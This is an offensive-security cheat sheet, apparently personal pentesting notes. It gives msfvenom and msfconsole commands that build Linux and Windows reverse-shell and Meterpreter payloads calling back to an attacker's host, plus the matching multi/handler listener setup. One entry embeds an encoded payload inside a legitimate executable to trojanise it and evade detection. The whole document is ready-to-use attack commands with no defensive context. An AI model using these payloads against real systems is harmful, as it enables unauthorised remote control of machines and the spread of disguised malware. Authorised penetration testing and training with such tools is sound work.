# Payloads

## Generate Payload from Msfconsole (NO Msfvenom)
```bash
use payload/[PAYLOAD]/[TO]/[USE]
```
```bash
generate -f exe -o /home/kali/Desktop/[FILE.EXE]
```
![](../../zzAttachments/Pasted%20image%2020250721111158.png)


---
---


## Msfvenom

## Linux
##### Staged reverse TCP
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f elf -o [NAME].elf
```
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f elf > [NAME].elf
```
```bash
use exploit/multi/handler
```
```bash
set payload linux/x86/meterpreter/reverse_tcp
```
##### Stageless reverse TCP
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f elf -o [NAME].elf
```
```bash
use exploit/multi/handler
```
```bash
set payload linux/x86/shell/reverse_tcp
```


---
---


## Windows

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe -o [NAME].exe
```
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe > [NAME].exe
```
```bash
use exploit/multi/handler
```
```bash
set payload windows/meterpreter/reverse_tcp
```

##### Stageless
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe -o [NAME].exe
```
```bash
use exploit/multi/handler
```
```bash
set payload windows/shell_reverse_tcp
```

##### Staged
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe -o [NAME].exe
```
```bash
use exploit/multi/handler
```
```bash
set payload windows/shell/reverse_tcp
```

##### Binary Injection
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe -e x86/shikata_ga_nai -i 3 -x "/[BINARY].exe" -o [NAME].exe
```

| Options | Description                             |
| ------- | --------------------------------------- |
| -p      | payload to use                          |
| -f      | format (exe, elf, sh)                   |
| -e      | encoder to use                          |
| -i      | number of interations for encoder to do |
| -x      | executable file to use as a template    |
| -o      | output executable name                  |
